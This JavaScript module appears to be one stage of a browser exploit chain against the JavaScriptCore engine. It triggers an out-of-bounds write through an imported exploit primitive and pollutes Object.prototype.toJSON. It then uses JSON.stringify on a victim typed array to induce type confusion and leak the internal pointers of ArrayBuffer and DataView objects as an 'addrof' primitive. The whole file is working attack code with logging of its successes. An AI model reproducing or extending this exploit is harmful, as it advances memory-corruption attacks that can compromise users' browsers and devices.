// js/script3/testArrayBufferVictimCrash.mjs (v53_AggressiveLeakAndProbe)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP = "OriginalHeisenbug_TypedArrayAddrof_v53_AggressiveLeakAndProbe";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v53 = null;
let leak_target_dataview_v53 = null;

let victim_typed_array_ref_v53 = null;
let probe_call_count_v53 = 0;
let all_probe_interaction_details_v53 = [];
let first_call_details_object_ref_v53 = null;

const PROBE_CALL_LIMIT_V53 = 10; // Aumentado para mais interações

function toJSON_TA_Probe_AggressiveLeakAndProbe() {
    probe_call_count_v53++;
    const call_num = probe_call_count_v53;
    let current_call_details = {
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v53_AggressiveLeakAndProbe",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v53),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v53 && first_call_details_object_ref_v53 !== null),
        payload_AB_assigned_to_C1: false,
        payload_DV_assigned_to_C1: false,
        direct_numeric_leak_A_attempted_val: null,
        direct_numeric_leak_B_attempted_val: null,
        addrof_result_from_this_typedarray_read: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V53) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v53.push(current_call_details);
            return { recursion_stopped_v53: true, call: call_num };
        }

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Storing C1_details ref.`, "info");
            first_call_details_object_ref_v53 = current_call_details;
            all_probe_interaction_details_v53.push(current_call_details);
            return current_call_details; // Retorna C1_details
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Assigning TypedArray payloads & attempting direct numeric conversion...`, "vuln");

            if (leak_target_buffer_v53) {
                this.payload_A_ab = leak_target_buffer_v53; // Atribui ArrayBuffer
                current_call_details.payload_AB_assigned_to_C1 = true;
                try {
                    let temp_arr = new Float64Array(1);
                    temp_arr[0] = leak_target_buffer_v53;
                    this.leaked_addr_A_direct = temp_arr[0];
                    current_call_details.direct_numeric_leak_A_attempted_val = this.leaked_addr_A_direct;
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_buffer_v53 to C1.payload_A_ab. Direct numeric conversion attempt: ${this.leaked_addr_A_direct}`, "info");
                } catch (e_conv_A) {
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error in direct numeric conversion for ArrayBuffer: ${e_conv_A.message}`, "warn");
                }
            }
            if (leak_target_dataview_v53) {
                this.payload_B_dv = leak_target_dataview_v53; // Atribui DataView
                current_call_details.payload_DV_assigned_to_C1 = true;
                 try {
                    let temp_arr = new Float64Array(1);
                    temp_arr[0] = leak_target_dataview_v53;
                    this.leaked_addr_B_direct = temp_arr[0];
                    current_call_details.direct_numeric_leak_B_attempted_val = this.leaked_addr_B_direct;
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_dataview_v53 to C1.payload_B_dv. Direct numeric conversion attempt: ${this.leaked_addr_B_direct}`, "info");
                } catch (e_conv_B) {
                    logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Error in direct numeric conversion for DataView: ${e_conv_B.message}`, "warn");
                }
            }
            all_probe_interaction_details_v53.push(current_call_details);
            return this; // Retorna C1_details modificado
        }
        // Caso 3: 'this' é um ArrayBuffer ou DataView injetado (payload do C1_details)
        else if ( (this === leak_target_buffer_v53 && current_call_details.this_type === '[object ArrayBuffer]') ||
                  (this === leak_target_dataview_v53 && current_call_details.this_type === '[object DataView]') ) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE INJECTED ${current_call_details.this_type}! Attempting to read internal pointer...`, "critical");
            let leaked_val = null;
            try {
                let view_on_this_target;
                if (current_call_details.this_type === '[object ArrayBuffer]') {
                    view_on_this_target = new DataView(this);
                } else { // DataView
                    view_on_this_target = this;
                }
                const offset_to_read = JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET; // 0x10
                 if (view_on_this_target.byteLength < (offset_to_read + 8)) {
                    throw new RangeError(`Target object too small (${view_on_this_target.byteLength} bytes) to read 8 bytes from offset ${toHex(offset_to_read)}.`);
                }
                let low = view_on_this_target.getUint32(offset_to_read, true);
                let high = view_on_this_target.getUint32(offset_to_read + 4, true);
                let int64_val = new AdvancedInt64(low, high);
                let temp_buffer_for_float_conversion = new ArrayBuffer(8);
                (new Uint32Array(temp_buffer_for_float_conversion))[0] = int64_val.low();
                (new Uint32Array(temp_buffer_for_float_conversion))[1] = int64_val.high();
                leaked_val = (new Float64Array(temp_buffer_for_float_conversion))[0];

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Read from 'this' (${current_call_details.this_type}) at offset ${toHex(offset_to_read)}. Leaked: ${int64_val.toString(true)} (as double: ${leaked_val})`, "vuln");
                current_call_details.addrof_result_from_this_typedarray_read = leaked_val;
                all_probe_interaction_details_v53.push(current_call_details);
                // Retorna um objeto que será o resultado final do JSON.stringify se este for o último passo
                return { leaked_address_v53: leaked_val, leaked_obj_type: current_call_details.this_type, from_offset: toHex(offset_to_read) };
            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from injected ${current_call_details.this_type}: ${e_leak.name} - ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v53.push(current_call_details);
                return { addrof_error_v53: e_leak.message, type: current_call_details.this_type };
            }
        }
        // Caso 4: 'this' é um [object Object] genérico, não o C1_details
        else if (current_call_details.this_type === '[object Object]') {
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. No special action.`, "warn");
             all_probe_interaction_details_v53.push(current_call_details);
             return this; // Retornar para ver se é processado
        }
        // Caso 5: Outros tipos
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected type: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v53.push(current_call_details);
            return { generic_marker_v53: call_num };
        }
    } catch (e) {
        current_call_details.error_in_probe = e.message;
        const FNAME_CURRENT_TEST_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST_REF);
        all_probe_interaction_details_v53.push(current_call_details);
        return { error_marker_v53: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_AggressiveLeakAndProbe() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (AggressiveLeakAndProbe) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP} Init...`;

    probe_call_count_v53 = 0;
    all_probe_interaction_details_v53 = [];
    victim_typed_array_ref_v53 = null;
    first_call_details_object_ref_v53 = null;

    leak_target_buffer_v53 = new ArrayBuffer(0x70); // Tamanho aumentado
    leak_target_dataview_v53 = new DataView(new ArrayBuffer(0x70)); // Tamanho aumentado

    let errorCapturedMain = null;
    let rawStringifyOutput = null;
    let stringifyOutput_parsed = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v53)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v53)" };
    const fillPattern = 0.53535353535353;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v53 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v53.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v53 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AggressiveLeakAndProbe, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v53)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v53);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Expected if circular. Output: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v53.find(d => d.call_number === 2 && d.this_is_C1_details_obj);
            if (call2Details && (call2Details.payload_AB_assigned_to_C1 || call2Details.payload_DV_assigned_to_C1)) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG on C1_details & PAYLOAD ASSIGNMENT CONFIRMED by probe Call #2!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug on C1_details (Call #2) or payload assignment NOT confirmed.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads (v53)...", "warn", FNAME_CURRENT_TEST);

            // Prioridade 1: Leitura direta de TypedArray/ArrayBuffer (Caso 3 da sonda)
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' && stringifyOutput_parsed.leaked_address_v53 !== undefined) {
                const leaked_addr_val = stringifyOutput_parsed.leaked_address_v53;
                logS3(`  V53_TARGET_ANALYSIS: Found 'leaked_address_v53' in stringifyOutput. Type: ${stringifyOutput_parsed.leaked_obj_type}, From Offset: ${stringifyOutput_parsed.from_offset}`, "good");
                if (typeof leaked_addr_val === 'number' && !isNaN(leaked_addr_val) && leaked_addr_val !== 0) {
                    let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                    if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                        if (stringifyOutput_parsed.leaked_obj_type === '[object ArrayBuffer]') {
                            addrof_A_result.success = true; addrof_A_result.msg = `V53 SUCCESS (Direct AB Read): ${p_int64.toString(true)} from ${stringifyOutput_parsed.from_offset}`;
                        } else if (stringifyOutput_parsed.leaked_obj_type === '[object DataView]') {
                            addrof_B_result.success = true; addrof_B_result.msg = `V53 SUCCESS (Direct DV Read): ${p_int64.toString(true)} from ${stringifyOutput_parsed.from_offset}`;
                        }
                    } else {
                        const msg = `V53 Direct Read num but not ptr pattern: ${p_int64.toString(true)}`;
                        if (stringifyOutput_parsed.leaked_obj_type === '[object ArrayBuffer]') addrof_A_result.msg = msg; else addrof_B_result.msg = msg;
                    }
                } else {
                     const msg = `V53 Direct Read value not a useful number: ${JSON.stringify(leaked_addr_val)}`;
                     if (stringifyOutput_parsed.leaked_obj_type === '[object ArrayBuffer]') addrof_A_result.msg = msg; else addrof_B_result.msg = msg;
                }
            }
            // Prioridade 2: Vazamento numérico direto do C1_details (leaked_addr_A/B_direct)
            else if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object' &&
                     (stringifyOutput_parsed.leaked_addr_A_direct !== undefined || stringifyOutput_parsed.leaked_addr_B_direct !== undefined) &&
                     stringifyOutput_parsed.call_number === 1) { // Certifica que é o C1_details
                logS3(`  V53_TARGET_ANALYSIS: Found 'leaked_addr_A/B_direct' in stringifyOutput (C1_details).`, "good");
                const leak_A_direct = stringifyOutput_parsed.leaked_addr_A_direct;
                if (typeof leak_A_direct === 'number' && !isNaN(leak_A_direct) && leak_A_direct !== 0) {
                    let pA_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leak_A_direct]).buffer)[0], new Uint32Array(new Float64Array([leak_A_direct]).buffer)[1]);
                    if (pA_int64.high() > 0x70000000 || pA_int64.low() > 0x10000000 || (pA_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_A_result.success = true; addrof_A_result.msg = `V53 SUCCESS (Direct Numeric Conv A): ${pA_int64.toString(true)}`;
                    } else { addrof_A_result.msg = `V53 DirectConv A num but not ptr: ${pA_int64.toString(true)}`; }
                } else { addrof_A_result.msg = `V53 DirectConv A value not useful num: ${JSON.stringify(leak_A_direct)}`; }

                const leak_B_direct = stringifyOutput_parsed.leaked_addr_B_direct;
                if (typeof leak_B_direct === 'number' && !isNaN(leak_B_direct) && leak_B_direct !== 0) {
                    let pB_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leak_B_direct]).buffer)[0], new Uint32Array(new Float64Array([leak_B_direct]).buffer)[1]);
                     if (pB_int64.high() > 0x70000000 || pB_int64.low() > 0x10000000 || (pB_int64.high() & 0xFF000000) === 0x80000000) {
                        addrof_B_result.success = true; addrof_B_result.msg = `V53 SUCCESS (Direct Numeric Conv B): ${pB_int64.toString(true)}`;
                    } else { addrof_B_result.msg = `V53 DirectConv B num but not ptr: ${pB_int64.toString(true)}`; }
                } else { addrof_B_result.msg = `V53 DirectConv B value not useful num: ${JSON.stringify(leak_B_direct)}`; }
            }
            // Fallback: Se houve erro de circularidade
            else if (stringifyOutput_parsed && stringifyOutput_parsed.parse_error && rawStringifyOutput.includes("circular structure")) {
                addrof_A_result.msg = "V53 Raw stringify output had 'circular structure'. Addrof via this path failed.";
                addrof_B_result.msg = "V53 Raw stringify output had 'circular structure'. Addrof via this path failed.";
                logS3(`  V53 Raw stringify output indicates circular structure. This is a good sign for control.`, "info");
            } else {
                addrof_A_result.msg = "V53 stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                addrof_B_result.msg = "V53 stringifyOutput_parsed was not an object, null, or did not contain expected payloads.";
                logS3(`  V53 stringifyOutput_parsed type: ${typeof stringifyOutput_parsed}, content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn");
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V53_ALAP} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v53}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v53 = null;
        all_probe_interaction_details_v53 = [];
        probe_call_count_v53 = 0;
        first_call_details_object_ref_v53 = null;
        leak_target_buffer_v53 = null;
        leak_target_dataview_v53 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v53],
        total_probe_calls: probe_call_count_v53,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
};
